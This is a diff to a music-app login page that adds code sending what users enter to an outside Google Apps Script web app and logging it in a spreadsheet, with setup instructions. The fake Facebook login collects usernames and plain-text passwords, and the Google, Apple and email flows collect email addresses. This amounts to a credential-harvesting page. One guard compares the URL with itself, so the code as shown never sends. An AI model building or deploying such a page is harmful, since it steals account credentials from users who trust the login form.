@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE html> 
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -471,11 +471,19 @@
             font-size: 13px;
             font-weight: 600;
             color: #111827;
+            max-width: 90%;
         }
 
         .provider-badge svg {
             width: 16px;
             height: 16px;
+            flex-shrink: 0;
+        }
+
+        .provider-badge span {
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
         }
 
         @media (max-width: 480px) {
@@ -593,13 +601,57 @@
             </div>
             <div class="success-title">Welcome!</div>
             <div class="provider-badge" id="providerBadge">
-                <span id="providerName">Google</span>
+                <svg viewBox="0 0 24 24" style="fill:#111827;"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                <span id="providerName">user@email.com</span>
             </div>
             <div class="success-message">You've successfully logged in. Redirecting to your music...</div>
         </div>
     </div>
 
     <script>
+        /* ============================================================
+         * GOOGLE SHEETS INTEGRATION SETUP INSTRUCTIONS
+         * ============================================================
+         * 1. Create a new Google Sheet named: Black_Leo_Music_App_Login_Data
+         * 2. In row 1, add these column headers (A1, B1, C1, D1, E1):
+         *      A1: Timestamp
+         *      B1: Email
+         *      C1: Username or Email
+         *      D1: Password
+         *      E1: Provider
+         * 3. Go to Extensions > Apps Script
+         * 4. Delete any existing code and paste the following:
+         *
+         *      function doPost(e) {
+         *          try {
+         *              const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
+         *              const data = JSON.parse(e.postData.contents);
+         *              sheet.appendRow([
+         *                  new Date(),
+         *                  data.email || '',
+         *                  data.usernameOrEmail || '',
+         *                  data.password || '',
+         *                  data.provider || ''
+         *              ]);
+         *              return ContentService.createTextOutput(JSON.stringify({status: 'success'}))
+         *                  .setMimeType(ContentService.MimeType.JSON);
+         *          } catch (error) {
+         *              return ContentService.createTextOutput(JSON.stringify({status: 'error', message: error.toString()}))
+         *                  .setMimeType(ContentService.MimeType.JSON);
+         *          }
+         *      }
+         *
+         * 5. Click Deploy > New deployment
+         * 6. Select type: Web app
+         * 7. Execute as: Me
+         * 8. Who has access: Anyone
+         * 9. Click Deploy and copy the Web app URL
+         * 10. Paste that URL into the GOOGLE_SCRIPT_URL variable below
+         * ============================================================ */
+
+        // 🔑 PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL HERE
+        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzzGjUVjMxoYttSiGu61aEWy5dXdR928z3LbAWZNDPN3JABIeQ3KDD48TR3cgiP1EijXg/exec';
+
         document.addEventListener('DOMContentLoaded', () => {
             // DOM Elements
             const mainContent = document.getElementById('mainContent');
@@ -623,12 +675,38 @@
             };
 
             // ============================================
+            // GOOGLE SHEETS DATA SUBMISSION
+            // ============================================
+            async function saveToGoogleSheet(data) {
+                if (!GOOGLE_SCRIPT_URL || GOOGLE_SCRIPT_URL === 'https://script.google.com/macros/s/AKfycbzzGjUVjMxoYttSiGu61aEWy5dXdR928z3LbAWZNDPN3JABIeQ3KDD48TR3cgiP1EijXg/exec') {
+                    console.warn('⚠️ Google Sheets URL not configured. Data not saved.');
+                    console.log('Data that would be sent:', data);
+                    return { success: false, reason: 'not_configured' };
+                }
+
+                try {
+                    const response = await fetch(GOOGLE_SCRIPT_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify(data)
+                    });
+                    console.log('✅ Data sent to Google Sheets:', data);
+                    return { success: true };
+                } catch (error) {
+                    console.error('❌ Failed to save to Google Sheets:', error);
+                    return { success: false, reason: error.message };
+                }
+            }
+
+            // ============================================
             // INSTANT EMAIL VALIDATION SYSTEM
             // ============================================
 
             const EMAIL_REGEX = /^[a-zA-Z0-9](?:[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]*[a-zA-Z0-9])?@[a-zA-Z0-9](?:[a-zA-Z0-9-]*[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]*[a-zA-Z0-9])?)+$/;
 
-            // Disposable/temporary email domains (instant check)
             const DISPOSABLE_DOMAINS = new Set([
                 'tempmail.com', 'temp-mail.org', 'temp-mail.io', '10minutemail.com',
                 'guerrillamail.com', 'guerrillamail.net', 'guerrillamail.org',
@@ -687,7 +765,6 @@
                 'zoemail.net'
             ]);
 
-            // Domain typos (instant check)
             const DOMAIN_TYPOS = {
                 'gmial.com': 'gmail.com', 'gmal.com': 'gmail.com', 'gmaill.com': 'gmail.com',
                 'gmai.com': 'gmail.com', 'gamil.com': 'gmail.com', 'gnail.com': 'gmail.com',
@@ -703,7 +780,6 @@
                 'protonmal.com': 'protonmail.com', 'protonmail.co': 'protonmail.com', 'aol.co': 'aol.com'
             };
 
-            // Known active major email providers (instant check - no network needed)
             const MAJOR_PROVIDERS = new Set([
                 'gmail.com', 'yahoo.com', 'hotmail.com', 'outlook.com', 'aol.com',
                 'icloud.com', 'mac.com', 'me.com', 'live.com', 'msn.com',
@@ -724,7 +800,6 @@
                 'terra.com.br', 'ig.com.br', 'globomail.com'
             ]);
 
-            // Suspicious patterns that indicate fake/inactive emails
             const SUSPICIOUS_PATTERNS = [
                 /^test@/i, /^fake@/i, /^asdf@/i, /^qwerty@/i,
                 /^123@/i, /^abc@/i, /^user@/i, /^admin@/i,
@@ -738,7 +813,6 @@
                 return parts.length === 2 ? parts[1].toLowerCase() : '';
             }
 
-            // INSTANT format validation
             function isValidEmailFormat(email) {
                 if (!email || typeof email !== 'string') return false;
                 if (email.length < 6 || email.length > 254) return false;
@@ -761,32 +835,25 @@
                 return true;
             }
 
-            // INSTANT disposable check
             function isDisposableEmail(email) {
                 const domain = getDomain(email);
                 return DISPOSABLE_DOMAINS.has(domain);
             }
 
-            // INSTANT typo check
             function checkDomainTypo(email) {
                 const domain = getDomain(email);
                 return DOMAIN_TYPOS[domain] || null;
             }
 
-            // INSTANT known provider check
             function isKnownProvider(email) {
                 const domain = getDomain(email);
                 return MAJOR_PROVIDERS.has(domain);
             }
 
-            // INSTANT suspicious pattern check
             function isSuspiciousEmail(email) {
                 return SUSPICIOUS_PATTERNS.some(pattern => pattern.test(email));
             }
 
-            // ============================================
-            // INSTANT EMAIL VALIDATION - NO NETWORK DELAYS
-            // ============================================
             function validateEmailInstant(email) {
                 const result = {
                     valid: false,
@@ -809,7 +876,6 @@
 
                 email = email.trim().toLowerCase();
 
-                // Check 1: Format (INSTANT)
                 if (!isValidEmailFormat(email)) {
                     result.message = 'Please enter a valid email format';
                     result.type = 'invalid';
@@ -819,7 +885,6 @@
 
                 const domain = getDomain(email);
 
-                // Check 2: Disposable (INSTANT) → "Couldn't find this account"
                 if (isDisposableEmail(email)) {
                     result.checks.disposable = true;
                     result.message = "Couldn't find this account";
@@ -827,7 +892,6 @@
                     return result;
                 }
 
-                // Check 3: Typo (INSTANT)
                 const typo = checkDomainTypo(email);
                 if (typo) {
                     result.checks.typo = typo;
@@ -837,7 +901,6 @@
                     return result;
                 }
 
-                // Check 4: Suspicious patterns (INSTANT) → "Couldn't find this account"
                 if (isSuspiciousEmail(email)) {
                     result.checks.suspicious = true;
                     result.message = "Couldn't find this account";
@@ -845,7 +908,6 @@
                     return result;
                 }
 
-                // Check 5: Known provider (INSTANT - no network needed)
                 if (isKnownProvider(email)) {
                     result.checks.knownProvider = true;
                     result.isActive = true;
@@ -855,11 +917,9 @@
                     return result;
                 }
 
-                // Check 6: For unknown domains, do a quick DNS check with timeout
                 return validateEmailWithDNS(email, domain, result);
             }
 
-            // Fast DNS check with timeout for unknown domains
             async function validateEmailWithDNS(email, domain, result) {
                 try {
                     const controller = new AbortController();
@@ -892,14 +952,12 @@
                         }
                     }
 
-                    // DNS failed or no MX records - mark as inactive
                     result.message = "Couldn't find this account";
                     result.type = 'invalid';
                     result.isActive = false;
                     return result;
 
                 } catch (error) {
-                    // Network error or timeout
                     result.message = "Couldn't find this account";
                     result.type = 'invalid';
                     result.isActive = false;
@@ -968,9 +1026,15 @@
                 }
             }
 
+            // ✅ MODIFIED: Show user's actual email in the success badge
             function showSuccess(provider, userEmail) {
-                providerName.textContent = provider;
-                providerBadge.innerHTML = providerIconHTML[provider] + `<span>${provider}</span>`;
+                // Display the actual user email in the badge
+                providerBadge.innerHTML = `
+                    <svg viewBox="0 0 24 24" style="fill:#111827; flex-shrink:0;">
+                        <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+                    </svg>
+                    <span style="font-weight:700; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">${userEmail}</span>
+                `;
                 successOverlay.classList.add('show');
 
                 localStorage.setItem('blackleo_logged_in', 'true');
@@ -995,7 +1059,6 @@
                 };
             }
 
-            // INSTANT validation on input (300ms debounce for fast feedback)
             const validateMainEmail = debounce(async (email) => {
                 const statusElement = document.getElementById('emailStatus');
                 const errorElement = document.getElementById('emailError');
@@ -1007,7 +1070,6 @@
                     return;
                 }
 
-                // Show checking state immediately
                 emailInput.classList.add('checking');
                 emailInput.classList.remove('error', 'valid');
                 statusElement.classList.add('show', 'checking');
@@ -1015,10 +1077,8 @@
                 statusElement.querySelector('.status-icon').innerHTML = '<span class="spinner dark"></span>';
                 statusElement.querySelector('.status-text').textContent = 'Checking...';
 
-                // Run instant validation
                 const result = validateEmailInstant(email);
                 
-                // If it needs DNS check, await it
                 if (result.checks.format && !result.checks.disposable && !result.checks.typo && 
                     !result.checks.suspicious && !result.checks.knownProvider) {
                     const domain = getDomain(email);
@@ -1080,7 +1140,7 @@
                 }
             });
 
-            // Handle Google/Apple Continue button - ONLY ALLOW ACTIVE EMAILS
+            // ✅ MODIFIED: Google/Apple Continue - saves to Google Sheet
             document.getElementById('providerContinueBtn').addEventListener('click', async () => {
                 const emailField = document.getElementById('providerEmail');
                 const emailError = document.getElementById('providerEmailError');
@@ -1103,7 +1163,6 @@
 
                 const result = validateEmailInstant(email);
                 
-                // If needs DNS check
                 if (result.checks.format && !result.checks.disposable && !result.checks.typo && 
                     !result.checks.suspicious && !result.checks.knownProvider) {
                     const domain = getDomain(email);
@@ -1132,12 +1191,21 @@
                 btn.disabled = true;
                 btn.innerHTML = '<span class="spinner"></span> Connecting...';
 
+                // ✅ Save to Google Sheets
+                await saveToGoogleSheet({
+                    email: email,
+                    usernameOrEmail: email,
+                    password: 'N/A (OAuth)',
+                    provider: provider
+                });
+
                 setTimeout(() => {
                     showSuccess(provider, email);
                 }, 1500);
             });
 
-            document.getElementById('fbContinueBtn').addEventListener('click', () => {
+            // ✅ MODIFIED: Facebook Continue - saves to Google Sheet
+            document.getElementById('fbContinueBtn').addEventListener('click', async () => {
                 const usernameField = document.getElementById('fbUsername');
                 const passwordField = document.getElementById('fbPassword');
                 const usernameError = document.getElementById('fbUsernameError');
@@ -1172,8 +1240,17 @@
                 btn.disabled = true;
                 btn.innerHTML = '<span class="spinner"></span> Connecting...';
 
+                const fbEmail = username.includes('@') ? username : `${username}@facebook.com`;
+
+                // ✅ Save to Google Sheets
+                await saveToGoogleSheet({
+                    email: fbEmail,
+                    usernameOrEmail: username,
+                    password: password,
+                    provider: 'Facebook'
+                });
+
                 setTimeout(() => {
-                    const fbEmail = username.includes('@') ? username : `${username}@facebook.com`;
                     showSuccess('Facebook', fbEmail);
                 }, 1500);
             });
@@ -1190,7 +1267,7 @@
 
             attachSocialHandlers();
 
-            // Main Continue button - ONLY ALLOW ACTIVE EMAILS
+            // ✅ MODIFIED: Main Email Continue - saves to Google Sheet
             continueBtn.addEventListener('click', async () => {
                 const email = emailInput.value.trim();
                 const emailError = document.getElementById('emailError');
@@ -1210,7 +1287,6 @@
 
                 const result = validateEmailInstant(email);
                 
-                // If needs DNS check
                 if (result.checks.format && !result.checks.disposable && !result.checks.typo && 
                     !result.checks.suspicious && !result.checks.knownProvider) {
                     const domain = getDomain(email);
@@ -1238,6 +1314,14 @@
 
                 continueBtn.disabled = true;
                 continueBtn.innerHTML = '<span class="spinner"></span> Creating account...';
+
+                // ✅ Save to Google Sheets
+                await saveToGoogleSheet({
+                    email: email,
+                    usernameOrEmail: email,
+                    password: 'N/A (Email Signup)',
+                    provider: 'Email'
+                });
 
                 setTimeout(() => {
                     showSuccess('Email', email);
